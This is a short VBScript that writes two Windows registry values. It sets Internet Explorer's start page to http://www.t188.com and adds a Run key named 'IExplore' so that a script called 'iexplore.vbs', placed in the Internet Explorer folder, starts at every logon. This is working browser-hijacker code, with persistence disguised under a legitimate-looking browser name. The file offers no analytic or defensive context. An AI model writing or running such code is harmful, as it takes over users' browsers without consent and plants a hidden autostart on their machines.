Dim OperationRegistry
Set OperationRegistry=WScript.CreateObject("WScript.Shell")
OperationRegistry.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://www.t188.com"
OperationRegistry.RegWrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\IExplore","C:\Program Files\Internet Explorer\iexplore.vbs"